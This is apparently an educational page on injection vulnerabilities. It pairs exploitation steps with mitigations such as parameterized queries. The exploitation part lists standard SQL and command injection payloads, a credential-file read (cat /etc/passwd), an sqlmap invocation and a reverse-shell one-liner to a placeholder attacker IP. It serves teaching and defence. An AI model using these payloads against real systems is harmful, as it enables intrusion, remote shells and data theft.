# [Severity 1] Injection

## Description
Injection vulnerabilities occur when an application mistakenly executes untrusted data as part of a query or command. These vulnerabilities can affect databases (SQL injection), operating systems (OS command injection), or LDAP directories, among others. Injection attacks happen when an application accepts unsanitized inputs from users and includes them in commands sent to an interpreter (like SQL, shell, or LDAP), allowing attackers to alter commands and execute unauthorized actions.

Common types of injection attacks include:
- **SQL Injection (SQLi)**: Malicious SQL commands are injected to control a database.
- **Command Injection**: Commands are injected into an application’s command-line execution.
- **LDAP Injection**: Malicious LDAP commands are used to manipulate directory services.

## Exploitation Method

### 1. Locate Input Fields for Injection
   - Find input fields where the application interacts with a backend database or executes commands based on user input. Typical targets include login forms, search bars, feedback forms, URL parameters, or any part of the application where user data is processed.
   - **Example**: In a login form, if the application uses SQL to verify credentials like this: `SELECT * FROM users WHERE username='[user_input]' AND password='[user_input]'`, then injecting SQL syntax directly into these fields may modify the query.

### 2. Test with Basic Injection Payloads
   - Begin by testing input fields with simple payloads to check if the application processes the input as part of a query.
   - **Example Payloads**:
     - **SQL Injection**: Input `' OR '1'='1` in a login field. This would change the SQL query to always return true (bypassing authentication).
       - Query before injection: `SELECT * FROM users WHERE username='user' AND password='password'`
       - Query after injection: `SELECT * FROM users WHERE username='' OR '1'='1' AND password=''`, making the query always true.
     - **Command Injection**: For command-line applications, try inputs like `; ls` or `| whoami` to see if the command is executed.
       - *Example*: If the application uses a command such as `ping [user_input]`, injecting `; ls` as the input may list server files if the input is not sanitized.

### 3. Refine the Payload Based on Application Response
   - After initial testing, adjust payloads according to the application’s responses to understand the level of vulnerability.
     - **Observe Error Messages**: If errors reveal database or system details (e.g., SQL errors showing table names), use these hints to craft targeted injection queries.
     - **Blind SQL Injection**: If no error messages appear, try Blind SQL injection techniques. For example, use time-based queries (`SLEEP(5)`) to test whether the server responds with a delay, indicating successful injection.
   - **Example**: If the application reveals database version details upon injecting `'; SELECT @@version;--`, you can tailor further SQL queries based on the database type and version.

### 4. Escalate Injection for Full Database Control
   - Once SQL injection is confirmed, you can use tools like SQLMap to automate the injection and extract data or gain unauthorized access.
   - **Example with SQLMap**: Running `sqlmap -u "http://example.com/login" --data="username=admin&password=admin"` can automate testing for SQL injection, extracting sensitive data like usernames and passwords from vulnerable databases.

### 5. Exploit Command Injection for Remote Code Execution (RCE)
   - If the application is vulnerable to command injection, you can execute commands directly on the server.
   - **Example**: Injecting `| whoami` or `; cat /etc/passwd` may allow you to view user permissions or sensitive files.
   - **Advanced Payload**: Use reverse shells by injecting payloads like `; bash -i >& /dev/tcp/[attacker_IP]/[port] 0>&1`, which can give an attacker full command-line access.

## Mitigation Techniques

1. **Use Parameterized Queries**:
   - Always use parameterized (prepared) statements where user input is treated as a variable, not part of the query.
   - **Example in SQL**:
     ```python
     cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
     ```
   - In this example, the input for `username` and `password` is treated strictly as data, not part of the SQL structure, making injection impossible.

2. **Validate and Sanitize User Input**:
   - Limit allowed characters and enforce strict input validation for each input field.
   - **Example**: Only allow alphanumeric characters for usernames and restrict special characters entirely in sensitive fields.
   - **Sanitize Command Inputs**: For applications using command-line input, avoid allowing direct user control over command parameters. Instead, hard-code parameters wherever possible.

3. **Implement Principle of Least Privilege**:
   - Limit database user privileges. An application should use a restricted database user with only necessary permissions (e.g., SELECT rather than INSERT or DELETE).
   - **Example**: If a database user has only read permissions, even if SQL injection occurs, attackers will be unable to delete or modify data.

4. **Error Handling Without Leaking Information**:
   - Customize error messages to avoid displaying database or server details to users, which can give attackers clues.
   - **Example**: Use generic error messages like “Invalid input” rather than detailed ones like “SQL syntax error near…”

5. **Regular Security Audits and Code Reviews**:
   - Perform routine security audits and source code reviews to detect any areas vulnerable to injection attacks.
   - Use automated tools like Burp Suite, OWASP ZAP, or SQLMap in a controlled environment to uncover potential vulnerabilities.

With this level of detail, you can better understand how to exploit injection vulnerabilities and protect applications from them. These steps showcase how attackers progress from simple injections to more complex methods, and why secure coding practices like input validation and prepared statements are crucial in mitigating injection risks.
